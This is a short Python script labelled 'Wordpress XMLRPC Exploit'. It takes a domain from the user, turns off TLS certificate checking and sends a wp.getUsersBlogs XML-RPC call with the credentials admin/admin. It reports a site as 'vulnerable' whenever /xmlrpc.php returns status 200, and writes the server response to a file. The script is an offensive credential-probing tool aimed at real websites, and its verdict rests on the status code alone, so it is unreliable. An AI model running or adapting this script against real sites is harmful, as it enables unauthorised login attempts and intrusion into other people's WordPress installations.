import requests,ssl,os
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url=input("Wordpress XMLRPC Exploit\nMade By Tolesh Kumar Jangid\nEnter the url: ")
type(url)

file_name= url+'.txt'
data = '<?xml version="1.0"encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>'
urls = 'https://'+url+'/xmlrpc.php'
f= open(file_name,'w+')
xmlrpc = requests.post(urls)
    # print(xmlrpc.status_code)
if xmlrpc.status_code == 200:
    resp=requests.post(urls,data=data, headers={'Content-Type': 'application/xml'})
    print('Status Code '+str(resp.status_code)+' '+'Domain '+url+' is vulnerable. ')
    print(urls)
    f.write('Domain '+url+'\n'+'Response '+'\n')
    f.write(str(resp.content))
else:
    print('not vulnerable')
    f.close()
    os.remove(file_name)